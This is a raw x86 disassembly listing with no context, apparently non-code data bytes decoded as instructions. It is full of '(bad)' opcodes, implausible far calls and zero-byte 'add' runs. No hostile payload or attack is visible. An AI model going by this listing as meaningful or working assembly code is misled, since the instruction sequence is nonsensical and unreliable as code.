  406361:	xchg   ecx,eax
  406362:	cwde   
  406363:	add    BYTE PTR [ebx+edx*4-0x6b64ff6c],dl
  40636a:	xchg   ebp,eax
  40636b:	add    BYTE PTR [ecx-0x69ff6a65],dl
  406371:	cdq    
  406372:	call   0xa700:0x9b9b9c00
  406379:	mov    WORD PTR [esi-0x7b754400],es
  40637f:	add    BYTE PTR [ebp-0x4aff726f],ch
  406385:	xchg   ecx,eax
  406386:	mov    eax,DWORD PTR [eax]
  406388:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406389:	popf   
  40638a:	pushf  
  40638b:	add    BYTE PTR [edi+ebx*4-0x5c52ff62],bh
  406392:	lahf   
  406393:	add    BYTE PTR [ebp-0x73ff695f],bh
  406399:	pushf  
  40639a:	mov    ds:0xa19d9500,eax
  40639f:	add    BYTE PTR [esi+ebx*4-0x4b69ff60],bl
  4063a6:	scas   al,BYTE PTR es:[edi]
  4063a7:	add    BYTE PTR [edi-0x5bff4851],dl
  4063ad:	mov    ds:0xa6a800a3,eax
  4063b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4063b3:	add    BYTE PTR [eax-0x5bff5359],ch
  4063b9:	stos   BYTE PTR es:[edi],al
  4063ba:	stos   DWORD PTR es:[edi],eax
  4063bb:	add    BYTE PTR [ebp-0x4eff5354],ch
  4063c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4063c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4063c3:	add    BYTE PTR [edx-0x4eff5859],bh
  4063c9:	lods   eax,DWORD PTR ds:[esi]
  4063ca:	lods   al,BYTE PTR ds:[esi]
  4063cb:	add    BYTE PTR [edx-0x51ff5453],bh
  4063d1:	mov    al,0xae
  4063d3:	add    BYTE PTR [ecx-0x4eff5150],bh
  4063d9:	scas   eax,DWORD PTR es:[edi]
  4063da:	mov    al,0x0
  4063dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4063dd:	mov    ch,0xb6
  4063df:	add    BYTE PTR [edx-0x52ff4b4f],ch
  4063e5:	mov    ebp,0xb3b400be
  4063ea:	mov    bl,0x0
  4063ec:	mov    ebx,0xb600b4b7
  4063f1:	mov    edx,0xb6b000b7
  4063f6:	mov    edx,0xb9b5ba00
  4063fb:	add    BYTE PTR [ecx-0x43ff4346],dh
  406401:	mov    esp,0x89c700bc
  406406:	add    BYTE PTR [eax],0xc8
  406409:	xchg   esi,eax
  40640a:	mov    es,WORD PTR [eax]
  40640c:	loop   0x40639d
  40640e:	add    BYTE PTR [eax],0xee
  406411:	cwde   
  406412:	xchg   DWORD PTR [eax],eax
  406414:	neg    BYTE PTR [ebx-0x5606ff77]
  40641a:	cdq    
  40641b:	add    ch,bh
  40641d:	mov    ah,0x9c
  40641f:	add    ah,al
  406421:	scas   al,BYTE PTR es:[edi]
  406422:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406423:	add    bh,al
  406425:	lods   al,BYTE PTR ds:[esi]
  406426:	stos   BYTE PTR es:[edi],al
  406427:	add    ch,dl
  406429:	lods   eax,DWORD PTR ds:[esi]
  40642a:	mov    ds:0xabb3c400,eax
  40642f:	add    ah,dl
  406431:	mov    cl,0xa7
  406433:	add    al,dl
  406435:	mov    bl,0xad
  406437:	add    ch,al
  406439:	mov    bh,0xb5
  40643b:	add    bl,cl
  40643d:	mov    esp,0xb4cc00b6
  406442:	mov    esi,0xbbbac000
  406447:	add    al,cl
  406449:	mov    ebp,0xb7e300bc
  40644e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40644f:	add    dl,bh
  406451:	mov    eax,0xbfed00a8
  406456:	mov    bh,0x0
  406458:	test   edx,0xc4e200ac
  40645e:	mov    esp,0xb5c7fb00
  406463:	add    BYTE PTR [esi-0x20ff3b41],dh
  406469:	test   al,0xc4
  40646b:	add    BYTE PTR [ebp-0x4eff3237],ch
  406471:	ret    0xc7
  406474:	mov    esi,0xb700c0c0
  406479:	(bad)  
  40647a:	retf   
  40647b:	add    BYTE PTR [ebp-0x46ff373a],bh
  406481:	retf   0xcc
  406484:	mov    dh,0xcc
  406486:	rol    BYTE PTR [eax],cl
  406488:	mov    edx,0xbe00d2ce
  40648d:	rcl    bl,1
  40648f:	add    BYTE PTR [edx-0x43ff272f],bh
  406495:	loopne 0x40647c
  406497:	add    ah,al
  406499:	(bad)  
  40649a:	les    eax,FWORD PTR [eax]
  40649c:	retf   0xc5c4
  40649f:	add    ah,al
  4064a1:	(bad)  
  4064a2:	leave  
  4064a3:	add    ch,al
  4064a5:	retf   
  4064a6:	retf   0xcb00
  4064a9:	int3   
  4064aa:	int3   
  4064ab:	add    ch,dl
  4064ad:	mov    bl,0x0
  4064b0:	ror    esp,cl
  4064b2:	int3   
  4064b3:	add    ch,cl
  4064b5:	ror    dh,1
  4064b7:	add    bl,al
  4064b9:	iret   
  4064ba:	rol    BYTE PTR [eax],cl
  4064bc:	fadd   st,st(4)
  4064be:	rol    BYTE PTR [eax],1
  4064c0:	ret    0xd5d1
  4064c3:	add    cl,cl
  4064c5:	rcl    bl,1
  4064c7:	add    dl,al
  4064c9:	aam    0xdb
  4064cb:	add    bl,cl
  4064cd:	xlat   BYTE PTR ds:[ebx]
  4064ce:	fild   DWORD PTR [eax]
  4064d0:	ret    
  4064d1:	(bad)  
  4064d3:	add    ch,cl
  4064d5:	(bad)  
  4064d7:	add    bl,dl
  4064d9:	rcl    ebx,cl
  4064db:	add    dl,bl
  4064dd:	aam    0xd4
  4064df:	add    dh,bl
  4064e1:	(bad)  
  4064e2:	fadd   DWORD PTR [eax]
  4064e4:	xlat   BYTE PTR ds:[ebx]
  4064e5:	fcmovu st,st(1)
  4064e7:	add    bl,bl
  4064e9:	(bad)  
  4064eb:	add    bl,ah
  4064ed:	int3   
  4064ee:	les    eax,FWORD PTR [eax]
  4064f0:	cld    
  4064f1:	fmul   st,st(1)
  4064f3:	add    bh,ah
  4064f5:	fstp   st(0)
  4064f7:	add    dh,bh
  4064f9:	fst    st(3)
  4064fb:	add    dh,ch
  4064fd:	loop   0x4064d9
  4064ff:	add    dh,bh
  406501:	jecxz  0x4064da
  406503:	add    cl,dl
  406505:	fsubrp st(1),st
  406507:	add    bl,al
  406509:	loopne 0x4064ef
  40650b:	add    bl,cl
  40650d:	in     al,0xe5
  40650f:	add    dh,al
  406511:	out    0xea,al
  406513:	add    dl,cl
  406515:	out    0xeb,al
  406517:	add    dh,al
  406519:	jmp    0xea0f660b
  40651e:	in     al,dx
  40651f:	add    cl,dl
  406521:	loope  0x406507
  406523:	add    dl,bl
  406525:	in     al,0xe6
  406527:	add    bl,bl
  406529:	in     eax,0xe8
  40652b:	add    ah,bl
  40652d:	in     al,dx
  40652e:	in     eax,dx
  40652f:	add    ah,al
  406531:	jmp    0x406525
  406533:	add    ah,dl
  406535:	out    dx,al
  406536:	hlt    
  406537:	add    ah,bl
  406539:	sti    
  40653a:	std    
  40653b:	add    cl,ah
  40653d:	loope  0x406520
  40653f:	add    cl,ch
  406541:	in     eax,0xe4
  406543:	add    al,ah
  406545:	call   0xec2c6634
  40654a:	jmp    0xff00:0xe5e9f900
  406551:	icebp  
  406552:	in     eax,dx
  406553:	add    ch,dh
  406555:	div    ch
  406557:	add    bh,bh
  406559:	clc    
  40655a:	test   BYTE PTR [eax],0xf5
  40655d:	idiv   cl
  40655f:	add    dh,bh
  406561:	(bad)  
  406562:	inc    BYTE PTR [eax]
  406564:	(bad)  
  406565:	(bad)  
  406566:	inc    DWORD PTR [eax]
	...
  4065b8:	add    ah,bl
  4065ba:	(bad)  
  4065bc:	iret   
  4065bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
	...
  4065d6:	add    bh,cl
  4065d8:	fnstsw ax
  4065da:	cmc    
  4065db:	loopne 0x4065bc
  4065dd:	loopne 0x4065ac
  4065df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
	...
  4065f4:	add    BYTE PTR [edx-0xa1f2120],ah
  4065fa:	cmc    
  4065fb:	rcl    ebx,cl
  4065fd:	clc    
  4065fe:	iret   
  4065ff:	rcr    esp,cl
  406601:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
	...
  406612:	add    BYTE PTR [eax],al
  406614:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406615:	fmul   st(5),st
  406617:	into   
  406618:	fdivr  st(5),st
  40661a:	cmc    
  40661b:	(bad)  
  40661d:	loopne 0x4065d6
  40661f:	int    0xa2
  406621:	int    0x9a
	...
  406633:	add    BYTE PTR [esi-0x2332595e],ah
  406639:	loopne 0x40661b
  40663b:	ror    ebp,cl
  40663d:	iret   
  40663e:	int    0xa6
  406640:	cmp    DWORD PTR [eax-0x31],0x0
	...
  406654:	iret   
  406655:	rol    ebx,cl
  406657:	ret    
  406658:	int    0xd3
  40665a:	(bad)  
  40665c:	int    0xc3
  40665e:	xchg   ecx,eax
  40665f:	jbe    0x4066d7
  406661:	add    DWORD PTR [ebx+0x0],0x0
  406668:	add    BYTE PTR [eax],al
  40666a:	adc    dh,BYTE PTR [edi+0x7f]
	...
  406675:	mov    ds:0x9ca4cfd3,al
  40667a:	cwde   
  40667b:	xor    DWORD PTR [esi+0xe],0xb
  40667f:	or     eax,0x9c95a27f
  406684:	int    0x0
  406686:	add    BYTE PTR [eax],al
  406688:	add    BYTE PTR [ebx-0x7c1f5d7d],al
  40668e:	or     cl,BYTE PTR [esi]
  406690:	xchg   ecx,eax
  406691:	add    DWORD PTR [eax],0x0
  406694:	add    BYTE PTR [eax],al
  406696:	add    BYTE PTR [eax+0x10108391],al
  40669c:	adc    BYTE PTR [esi-0x72],dh
  40669f:	call   0x95dc:0xefedd8c4
  4066a6:	add    BYTE PTR [eax],al
  4066a8:	add    BYTE PTR [edi-0x5c],bh
  4066ab:	js     0x406642
  4066ad:	fmul   st(5),st
  4066af:	xor    BYTE PTR [esi+0x7f],0x95
  4066b3:	jg     0x4066b5
  4066b5:	add    BYTE PTR [eax],al
  4066b7:	add    BYTE PTR [ebp-0x6f738186],dl
  4066bd:	fsubr  st,st(0)
  4066bf:	out    dx,al
  4066c0:	fdiv   QWORD PTR [edx-0x3c3a4a95]
  4066c6:	add    BYTE PTR [eax],al
  4066c8:	add    BYTE PTR [eax-0x6a6a775a],al
  4066ce:	xchg   ebp,eax
  4066cf:	iret   
  4066d0:	loopne 0x406655
  4066d2:	or     eax,0xc28d1076
  4066d7:	mov    ecx,0xafb4c5c1
  4066dd:	test   al,0x64
  4066df:	xor    DWORD PTR [eax],esp
  4066e1:	pop    ds
  4066e2:	pop    ss
  4066e3:	test   eax,ebp
  4066e5:	mov    ds:0x83000000,al
  4066ea:	int    0x91
  4066ec:	call   0xc88f:0x727b7f91
  4066f3:	repz hlt 
  4066f5:	out    dx,al
  4066f6:	int    0x89
  4066f8:	pusha  
  4066f9:	push   edi
  4066fa:	cmp    eax,0x1f1f1721
  4066ff:	and    DWORD PTR [edi],esp
  406701:	xor    BYTE PTR [eax],ch
  406703:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406704:	jmp    0xd383:0x91
  40670b:	mov    bl,BYTE PTR [edx-0x626a806d]
  406711:	into   
  406712:	xchg   edi,eax
  406713:	pop    edi
  406714:	push   esi
  406715:	aaa    
  406716:	sbb    al,0x13
  406718:	adc    edx,DWORD PTR [ebx]
  40671a:	adc    al,0x17
  40671c:	xor    bh,BYTE PTR [ebx]
  40671e:	cmp    al,0x3c
  406720:	dec    edx
  406721:	dec    edx
  406722:	inc    esi
  406723:	imul   ebp,esp,0x8a
  406729:	mov    ch,bl
  40672b:	xchg   ecx,eax
  40672c:	call   0x151d:0x4fd68395
  406733:	add    al,BYTE PTR [ecx]
  406735:	add    DWORD PTR [edx],eax
  406737:	adc    al,0x4
  406739:	pop    es
  40673a:	sbb    esp,DWORD PTR [esi]
  40673c:	dec    esp
  40673d:	dec    esp
  40673e:	dec    esp
  40673f:	dec    ebp
  406740:	dec    ebp
  406741:	popa   
  406742:	dec    ebx
  406743:	gs in  al,dx
  406745:	xchg   ebx,eax
  406746:	add    BYTE PTR [eax],al
  406748:	add    BYTE PTR [ebx-0x636a6c22],al
  40674e:	mov    gs,eax
  406750:	xor    eax,DWORD PTR [edx]
  406752:	sbb    al,0x19
  406754:	sbb    DWORD PTR [ecx],ebx
  406756:	sbb    DWORD PTR ds:0x2c03a296,eax
  40675c:	gs gs gs data16 bound sp,DWORD PTR gs:[esi-0x12]
  406765:	xchg   esp,eax
  406766:	add    BYTE PTR [eax],al
  406768:	add    BYTE PTR [esi-0x5b637721],cl
  40676e:	xchg   ecx,eax
  40676f:	aam    0x51
  406771:	sbb    al,0x35
  406773:	cs sbb al,BYTE PTR cs:[ebx]
  406777:	mov    ah,0xe0
  406779:	int    0x79
  40677b:	das    
  40677c:	push   0x6a
  40677e:	ins    BYTE PTR es:[edi],dx
  40677f:	ins    BYTE PTR es:[edi],dx
  406780:	ins    BYTE PTR es:[edi],dx
  406781:	ins    BYTE PTR es:[edi],dx
  406782:	addr16 addr16 out 0x9a,eax
  406786:	add    BYTE PTR [eax],al
  406788:	add    BYTE PTR [eax-0x3c65772d],cl
  40678e:	mov    ds:0x38195bd4,al
  406793:	cmp    BYTE PTR ds:0x58fbd208,dh
  406799:	xchg   ebp,esi
  40679b:	push   ecx
  40679c:	test   eax,0x6f6f6f6f
  4067a1:	jo     0x406813
  4067a3:	ins    DWORD PTR es:[edi],dx
  4067a4:	fcomp  QWORD PTR [edi-0x7d000000]
  4067aa:	mov    dh,0x79
  4067ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4067ad:	iret   
  4067ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4067af:	into   
  4067b0:	sub    BYTE PTR [esi],0x53
  4067b3:	push   ebp
  4067b4:	push   ebx
  4067b5:	sar    ecx,cl
  4067b7:	push   eax
  4067b8:	sub    DWORD PTR [edx],edi
  4067ba:	cmc    
  4067bb:	fstp   QWORD PTR [esi-0x56]
  4067be:	stos   BYTE PTR es:[edi],al
  4067bf:	stos   BYTE PTR es:[edi],al
  4067c0:	stos   DWORD PTR es:[edi],eax
  4067c1:	lods   al,BYTE PTR ds:[esi]
  4067c2:	lods   al,BYTE PTR ds:[esi]
  4067c3:	jo     0x406782
  4067c5:	mov    DWORD PTR [eax],0x967c0000
  4067cb:	jle    0x406784
  4067cd:	rol    ebx,cl
  4067cf:	into   
  4067d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4067d1:	xor    edx,DWORD PTR [ebp+0x57]
  4067d4:	push   ds
  4067d5:	push   esp
  4067d6:	xor    eax,0x5c2a2826
  4067db:	call   FWORD PTR [ebx-0x52535392]
  4067e1:	lods   eax,DWORD PTR ds:[esi]
  4067e2:	lods   eax,DWORD PTR ds:[esi]
  4067e3:	jo     0x4067a0
  4067e5:	fmul   st,st(5)
  4067e7:	add    BYTE PTR [eax],al
  4067e9:	jge    0x40685f
  4067eb:	jne    0x4067ad
  4067ed:	fmul   st(5),st
  4067ef:	into   
  4067f0:	lds    esi,FWORD PTR [edi]
  4067f2:	pop    esp
  4067f3:	push   ebp
  4067f4:	push   ss
  4067f5:	and    al,0x25
  4067f7:	sub    DWORD PTR [edx],ebp
  4067f9:	inc    esp
  4067fa:	inc    esi
  4067fb:	sar    edi,1
  4067fd:	test   BYTE PTR [edx-0x41454546],bh
  406803:	lods   eax,DWORD PTR ds:[esi]
  406804:	mov    ebx,0x95d6
  406809:	jae    0x406814
  40680b:	pmullw mm3,mm7
  40680e:	into   
  40680f:	ror    eax,cl
  406811:	ss pop ebp
  406813:	cmp    DWORD PTR [edi],edx
  406815:	sub    al,BYTE PTR es:[ebp+eax*2+0x43]
  40681a:	inc    edi
  40681b:	mov    al,0xe0
  40681d:	cmc    
  40681e:	test   BYTE PTR [esi-0x411d1d1e],bh
  406824:	mov    esp,0x8ed6
  406829:	jno    0x406831
  40682b:	or     al,0xce
  40682d:	(bad)  
  40682f:	ror    ecx,cl
  406831:	dec    ecx
  406832:	pop    ecx
  406833:	sbb    BYTE PTR ds:0x45442a28,ah
  406839:	inc    ecx
  40683a:	dec    esi
  40683b:	out    0xaf,al
  40683d:	loopne 0x4067e5
  40683f:	mov    esp,edx
  406841:	loop   0x406825
  406843:	loop   0x406801
  406845:	fild   DWORD PTR [edx+0x10b70000]
  40684b:	xchg   ebp,eax
  40684c:	std    
  40684d:	(bad)  
  40684e:	out    dx,eax
  40684f:	(bad)  
  406851:	push   edx
  406852:	das    
  406853:	pop    ss
  406854:	sub    BYTE PTR [edx],ch
  406856:	inc    esp
  406857:	inc    esp
  406858:	inc    edi
  406859:	inc    edx
  40685a:	push   0xdcb1e2fb
  40685f:	mov    ch,BYTE PTR [edi-0x411b191c]
  406865:	loopne 0x4067f5
  406867:	add    BYTE PTR [eax],al
  406869:	add    BYTE PTR [eax],al
  40686b:	ret    
  40686c:	mov    ds:0xe7ffffdf,al
  406871:	push   edx
  406872:	adc    al,0x24
  406874:	sub    BYTE PTR [edx],ch
  406876:	inc    esp
  406877:	inc    ebp
  406878:	inc    edi
  406879:	inc    edx
  40687a:	lods   eax,DWORD PTR ds:[esi]
  40687b:	sti    
  40687c:	in     al,0xe3
  40687e:	cwde   
  40687f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406880:	mov    bh,cl
  406882:	cli    
  406883:	cli    
  406884:	loop   0x40687c
  406886:	xchg   esp,eax
  406887:	add    BYTE PTR [eax],al
  406889:	add    BYTE PTR [eax],al
  40688b:	add    BYTE PTR [eax],al
  40688d:	add    BYTE PTR [edx+0x145ad4a2],ah
  406893:	and    eax,0x45442a29
  406898:	inc    edi
  406899:	dec    eax
  40689a:	in     al,0xff
  40689c:	cli    
  40689d:	stc    
  40689e:	in     eax,0xe5
  4068a0:	jecxz  0x406886
  4068a2:	out    0xe2,al
  4068a4:	lods   eax,DWORD PTR ds:[esi]
  4068a5:	stc    
  4068a6:	lahf   
	...
  4068af:	add    bh,cl
  4068b1:	mov    BYTE PTR [esi],dl
  4068b3:	and    ah,BYTE PTR [ebx]
  4068b5:	ds aas 
  4068b7:	inc    ecx
  4068b8:	inc    ecx
  4068b9:	dec    eax
  4068ba:	in     al,0xe2
  4068bc:	mov    esi,0xbabcbcbe
  4068c1:	mov    ecx,0xfbe1bdb9
  4068c6:	iret   
	...
  4068cf:	add    BYTE PTR [eax],al
  4068d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4068d2:	adc    ebx,DWORD PTR [edi]
  4068d4:	and    ebp,DWORD PTR [ebx]
  4068d6:	xor    DWORD PTR [ecx+eiz*2+0x6a],ecx
  4068da:	mov    al,0xb3
  4068dc:	mov    bl,0xb8
  4068de:	iret   
  4068df:	rcl    ebx,cl
  4068e1:	fucomi st,st(6)
  4068e3:	div    ecx
  4068e5:	test   BYTE PTR [eax],0x0
	...
  4068f0:	add    BYTE PTR [edi-0x596679a6],bh
  4068f6:	(bad)  
  4068f7:	retf   
  4068f8:	in     al,dx
  4068f9:	repnz out dx,al
  4068fb:	out    dx,eax
  4068fc:	test   DWORD PTR [eax],0x0
	...
  40690e:	add    BYTE PTR [eax],al
  406910:	add    ah,bl
  406912:	icebp  
  406913:	icebp  
	...
  406968:	(bad)  
  406969:	(bad)  
  40696a:	(bad)  
  40696b:	(bad)  
  40696c:	(bad)  
  40696d:	(bad)  
  40696e:	(bad)  
  40696f:	(bad)  
  406970:	(bad)  
  406971:	inc    DWORD PTR [ebx+0xfeffff]
  406977:	(bad)  
  406978:	(bad)  
  406979:	clc    
  40697a:	add    BYTE PTR [edi],bh
  40697c:	push   eax
  40697e:	add    BYTE PTR [edi],bl
  406980:	push   eax
  406982:	add    BYTE PTR [edi],bl
  406984:	push   eax
  406986:	add    BYTE PTR [edi],bl
  406988:	xbegin 0x3ec0708e
  40698e:	add    BYTE PTR [ebx],al
  406990:	or     BYTE PTR [edi],0x0
  406993:	add    eax,DWORD PTR [eax-0x7ffd0000]
  406999:	add    BYTE PTR [eax],al
  40699b:	add    eax,DWORD PTR [eax-0x7ffd0000]
  4069a1:	add    BYTE PTR [eax],al
  4069a3:	add    eax,DWORD PTR [eax-0x7ffd0000]
  4069a9:	add    BYTE PTR [eax],al
  4069ab:	add    eax,DWORD PTR [eax-0x7ffd0000]
  4069b1:	add    BYTE PTR [eax],al
  4069b3:	add    eax,DWORD PTR [eax-0x7fff0000]
  4069b9:	add    BYTE PTR [eax],al
  4069bb:	add    DWORD PTR [eax-0x7fff0000],eax
  4069c1:	add    BYTE PTR [eax],al
  4069c3:	add    DWORD PTR [eax-0x1fff0000],eax
  4069c9:	add    BYTE PTR [eax],al
  4069cb:	add    esp,edi
  4069cd:	add    BYTE PTR [eax],al
  4069cf:	add    edi,edi
  4069d1:	add    BYTE PTR [eax],al
  4069d3:	add    edi,edi
  4069d5:	add    BYTE PTR [eax],0x3
  4069d8:	inc    DWORD PTR [eax-0x700000f9]
  4069de:	(bad)  
  4069df:	(bad)  
  4069e0:	(bad)  
  4069e1:	(bad)  
  4069e2:	(bad)  
  4069e3:	(bad)  
  4069e4:	(bad)  
  4069e5:	(bad)  
  4069e6:	(bad)  
  4069e7:	jmp    FWORD PTR [eax]
  4069e9:	add    BYTE PTR [eax],al
  4069eb:	add    BYTE PTR [eax],dl
  4069ed:	add    BYTE PTR [eax],al
  4069ef:	add    BYTE PTR [eax],ah
  4069f1:	add    BYTE PTR [eax],al
  4069f3:	add    BYTE PTR [ecx],al
  4069f5:	add    BYTE PTR [eax],cl
  4069f7:	add    BYTE PTR [eax],al
  4069f9:	add    BYTE PTR [eax],al
  4069fb:	add    BYTE PTR [eax],al
  4069fd:	add    DWORD PTR [eax],eax
	...
  406a07:	add    BYTE PTR [eax],al
  406a09:	add    DWORD PTR [eax],eax
  406a0b:	add    BYTE PTR [eax],al
  406a0d:	add    DWORD PTR [eax],eax
  406a0f:	add    BYTE PTR [eax],al
  406a11:	add    BYTE PTR [eax],al
  406a13:	add    BYTE PTR [eax+0x44],cl
  406a16:	inc    ebx
  406a17:	add    BYTE PTR [ebx+0x79],bh
  406a1a:	jns    0x406a1c
  406a1c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406a1d:	(bad)  
  406a1e:	verw   WORD PTR [eax-0x54fff1f2]
  406a25:	adc    ecx,DWORD PTR ds:0xc1db900
  406a2b:	add    BYTE PTR [ecx-0x4dffdfe0],ch
  406a31:	sub    al,0x23
  406a33:	add    BYTE PTR [edi+ebp*1+0x2fbc0022],dh
  406a3a:	and    al,0x0
  406a3c:	mov    bl,0x31
  406a3e:	and    al,BYTE PTR [eax]
  406a40:	mov    ah,0x3f
  406a42:	das    
  406a43:	add    dl,cl
  406a45:	add    al,0x4
  406a47:	add    ah,bl
  406a49:	sldt   WORD PTR [eax]
  406a4c:	lds    ebx,FWORD PTR [eax]
  406a4e:	pop    es
  406a4f:	add    ch,al
  406a51:	sbb    al,0x9
  406a53:	add    ah,dl
  406a55:	sbb    DWORD PTR [ecx],eax
  406a57:	add    ah,dl
  406a59:	sbb    eax,0x1ad80001
  406a5e:	add    BYTE PTR [eax],al
  406a60:	fstp   DWORD PTR ds:0x12e80000
  406a66:	add    BYTE PTR [eax],al
  406a68:	out    0x1b,al
  406a6a:	add    BYTE PTR [eax],al
  406a6c:	in     eax,dx
  406a6d:	sbb    al,BYTE PTR [eax]
  406a6f:	add    bh,dh
  406a71:	push   ss
  406a72:	add    BYTE PTR [eax],al
  406a74:	retf   
  406a75:	and    eax,0x3bdd0003
  406a7a:	adc    BYTE PTR [eax],al
  406a7c:	jecxz  0x406aa4
  406a7e:	add    BYTE PTR [eax],al
  406a80:	mov    ah,0x40
  406a82:	xor    eax,0x3a43b800
  406a87:	add    dh,bl
  406a89:	inc    eax
  406a8a:	and    eax,0x2c47d700
  406a8f:	add    dh,bl
  406a91:	dec    edi
  406a92:	sub    eax,0x3441c000
  406a97:	add    bl,bl
  406a99:	pop    eax
  406a9a:	cmp    eax,DWORD PTR [eax]
  406a9c:	jecxz  0x406ae2
  406a9e:	daa    
  406a9f:	add    bh,bh
  406aa1:	pop    ecx
  406aa2:	ss add bh,bh
  406aa5:	xor    DWORD PTR gs:[eax],eax
  406aa8:	jmp    FWORD PTR [edx+0x3d]
  406aab:	add    bh,bh
  406aad:	jg     0x406aeb
  406aaf:	add    ch,bl
  406ab1:	pop    esp
  406ab2:	inc    ecx
  406ab3:	add    dl,bl
  406ab5:	bound  ecx,QWORD PTR [eax+0x0]
  406ab8:	fbstp  TBYTE PTR [ebx+0x43]
  406abb:	add    dh,dl
  406abd:	push   0x53
  406abf:	add    ch,dl
  406ac1:	ins    BYTE PTR es:[edi],dx
  406ac2:	pop    ecx
  406ac3:	add    bh,bh
  406ac5:	imul   ecx,DWORD PTR [eax+0x0],0xffffffff
  406ac9:	jo     0x406b16
  406acb:	add    ah,cl
  406acd:	jno    0x406b32
  406acf:	add    BYTE PTR [eax],al
  406ad1:	repnz dec eax
  406ad3:	add    dl,bl
  406ad5:	adc    DWORD PTR [ecx+0x0],0x5983d7
  406adc:	(bad)  
  406add:	sbb    BYTE PTR [eax+eax*1-0x2c],0x82
  406ae2:	jne    0x406ae4
  406ae4:	(bad)  
  406ae6:	add    BYTE PTR [eax],0x8a
  406ae9:	mov    cl,BYTE PTR [edx-0x6f6f6f00]
  406aef:	add    BYTE PTR [esp+edx*4-0x6364ff6c],dl
  406af6:	pushf  
  406af7:	add    BYTE PTR [esi-0x4cff6162],bl
  406afd:	lea    eax,[edi-0x5f5f6100]
  406b03:	add    BYTE PTR [ecx-0x5fff5a41],bl
  406b09:	mov    al,ds:0xa4a400a0
  406b0e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406b0f:	add    BYTE PTR [edx-0x54ff5556],ch
  406b15:	lods   al,BYTE PTR ds:[esi]
  406b16:	lods   al,BYTE PTR ds:[esi]
  406b17:	add    BYTE PTR [ebp-0x4fff5253],ch
  406b1d:	mov    cl,0xb1
  406b1f:	add    BYTE PTR [ebp+esi*4-0x4647ff4b],dh
  406b26:	mov    ecx,0xbcbcbb00
  406b2b:	add    BYTE PTR [esi-0xcff4142],bh
  406b31:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406b32:	nop
  406b33:	add    al,al
  406b35:	mov    edx,0xc0c000b8
  406b3a:	rol    BYTE PTR [eax],0xc4
  406b3d:	mov    dh,0x0
  406b40:	leave  
  406b41:	(bad)
  406b44:	(bad)
  406b47:	add    al,cl
  406b49:	retf   0xca
  406b4c:	leave  
  406b4d:	retf   
  406b4e:	int3   
  406b4f:	add    dl,cl
  406b51:	int3   
  406b52:	int3   
  406b53:	add    ah,cl
  406b55:	into   
  406b56:	into   
  406b57:	add    ah,bl
  406b59:	retf   0xc9
  406b5c:	into   
  406b5d:	rcl    al,1
  406b5f:	add    al,dl
  406b61:	rcl    edx,1
  406b63:	add    dh,dl
  406b65:	(bad)  
  406b66:	aad    0x0
  406b68:	(bad)  
  406b6a:	fld    DWORD PTR [eax]
  406b6c:	(bad)  
  406b6e:	fild   WORD PTR [eax]
  406b70:	loope  0x406b53
  406b72:	loope  0x406b74
  406b74:	call   0xee415461
  406b79:	out    dx,al
  406b7a:	out    dx,al
  406b7b:	add    al,bh
  406b7d:	clc    
  406b7e:	clc    
	...
  406e0b:	add    bh,bh
  406e0d:	(bad)  
  406e0e:	inc    DWORD PTR [eax]
	...
  406e20:	aaa    
  406e21:	add    dh,BYTE PTR [edi]
  406e23:	add    BYTE PTR [eax],al
  406e25:	add    BYTE PTR [esi+0x46],al
  406e28:	inc    esp
  406e29:	cmp    DWORD PTR [ecx],edi
  406e2b:	cmp    al,0x3e
  406e2d:	add    BYTE PTR [eax],al
  406e2f:	add    BYTE PTR [edx+0x37],cl
  406e32:	inc    esp
  406e33:	add    BYTE PTR [eax],al
  406e35:	add    BYTE PTR [ecx+0x4e],bl
  406e38:	dec    edx
  406e39:	inc    esi
  406e3a:	inc    eax
  406e3b:	add    BYTE PTR ds:[eax],al
  406e3e:	add    BYTE PTR [eax],al
  406e40:	inc    eax
  406e41:	dec    edx
  406e42:	add    BYTE PTR ds:[eax],al
  406e45:	add    BYTE PTR [eax],al
  406e47:	add    BYTE PTR [esi+0x36],al
  406e4a:	cmp    DWORD PTR [eax],eax
  406e4c:	add    BYTE PTR [eax],al
  406e4e:	add    BYTE PTR [eax],al
  406e50:	inc    esp
  406e51:	push   esp
  406e52:	inc    eax
  406e53:	pop    eax
  406e54:	dec    edx
  406e55:	inc    esi
  406e56:	inc    esi
  406e57:	inc    esi
  406e58:	inc    esp
  406e59:	inc    eax
  406e5a:	inc    eax
  406e5b:	ds ds ds ds dec esi
  406e60:	inc    eax
  406e61:	push   esp
  406e62:	inc    eax
  406e63:	push   ebx
  406e64:	push   ebx
  406e65:	push   ebx
  406e66:	dec    esi
  406e67:	dec    esi
  406e68:	dec    esi
  406e69:	dec    esi
  406e6a:	dec    esi
  406e6b:	dec    esi
  406e6c:	dec    esi
  406e6d:	dec    esi
  406e6e:	dec    esi
  406e6f:	cmp    DWORD PTR [esp+edx*2+0x40],eax
  406e73:	push   ebx
  406e74:	inc    eax
  406e75:	add    eax,DWORD PTR [ebx]
  406e77:	add    eax,DWORD PTR [edi]
  406e79:	or     al,0x12
  406e7b:	adc    dl,BYTE PTR [ecx+ebx*1]
  406e7e:	dec    edx
  406e7f:	ds inc ebx
  406e81:	push   esp
  406e82:	inc    eax
  406e83:	push   esp
  406e84:	inc    eax
  406e85:	or     DWORD PTR [ecx],ecx
  406e87:	push   es
